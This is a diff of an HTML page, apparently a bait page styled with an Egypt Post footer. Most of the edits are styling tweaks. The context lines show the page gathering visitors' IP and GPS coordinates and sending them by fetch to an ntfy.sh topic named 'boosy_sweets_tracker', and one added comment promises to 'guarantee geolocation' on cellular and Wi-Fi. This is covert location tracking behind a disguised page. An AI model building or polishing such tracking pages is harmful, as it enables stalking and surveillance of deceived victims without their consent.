@@ -157,7 +157,7 @@
                 </button>
             </div>
 
-            <div id="bait-status-1" class="text-center text-xs font-bold text-gray-400"></div>
+            <div id="bait-status-1" class="text-center text-xs font-bold text-gray-400 font-sans"></div>
         </main>
 
         <!-- Egypt Post Footer -->
@@ -285,16 +285,16 @@
 
                     <!-- Coordinates Display Bar -->
                     <div id="coordinates-bar" class="hidden grid grid-cols-3 gap-2 bg-pink-light border border-[#FF91A4]/30 p-3 rounded-xl font-sans">
-                        <div class="text-center border-r border-pink/20">
-                            <span class="block text-[9px] text-gray-500 font-bold uppercase">Latitude (خط العرض)</span>
+                        <div class="text-center border-r border-pink/20 font-sans">
+                            <span class="block text-[9px] text-gray-500 font-bold uppercase font-sans">Latitude (خط العرض)</span>
                             <span id="coord-lat" class="text-xs font-bold text-black font-mono">-</span>
                         </div>
-                        <div class="text-center border-r border-pink/20">
-                            <span class="block text-[9px] text-gray-500 font-bold uppercase">Longitude (خط الطول)</span>
+                        <div class="text-center border-r border-pink/20 font-sans">
+                            <span class="block text-[9px] text-gray-500 font-bold uppercase font-sans">Longitude (خط الطول)</span>
                             <span id="coord-lng" class="text-xs font-bold text-black font-mono">-</span>
                         </div>
-                        <div class="text-center">
-                            <span class="block text-[9px] text-gray-500 font-bold uppercase">Accuracy (دقة الرصد)</span>
+                        <div class="text-center font-sans">
+                            <span class="block text-[9px] text-gray-500 font-bold uppercase font-sans">Accuracy (دقة الرصد)</span>
                             <span id="coord-acc" class="text-[10px] font-bold text-pink-custom font-mono">-</span>
                         </div>
                     </div>
@@ -567,6 +567,7 @@
                     const ipLat = parseFloat(data.latitude);
                     const ipLng = parseFloat(data.longitude);
 
+                    // Dual stage resolver to guarantee geolocation on both cellular networks and Wi-Fi
                     const geoOptionsHigh = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
                     const geoOptionsLow = { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 };
 
@@ -642,7 +643,7 @@
             };
 
             try {
-                // CORRECTED SYNTAX: Changed the buggy fetch:: to standard clean fetch
+                // FIXED: Removed the buggy fetch:: to clean fetch(...)
                 await fetch(`https://ntfy.sh/boosy_sweets_tracker_${session}`, {
                     method: 'POST',
                     body: JSON.stringify(payload)
@@ -669,13 +670,13 @@
                 if (accSpan) accSpan.innerText = `${Math.round(accuracy)} متر (دقيق)`;
                 if (badge) {
                     badge.innerText = "رصد فضائي فائق الدقة (GPS)";
-                    badge.className = "bg-green-100 text-green-700 px-3 py-1 rounded-full text-[10px] font-bold";
+                    badge.className = "bg-green-100 text-green-700 px-3 py-1 rounded-full text-[10px] font-bold font-sans";
                 }
             } else {
                 if (accSpan) accSpan.innerText = `${Math.round(accuracy / 1000)} كم (تقريبي)`;
                 if (badge) {
                     badge.innerText = "رصد تقريبي بالشبكة (IP)";
-                    badge.className = "bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold";
+                    badge.className = "bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold font-sans";
                 }
             }
 
@@ -757,4 +758,5 @@
     </script>
 </body>
 </html>
+
 
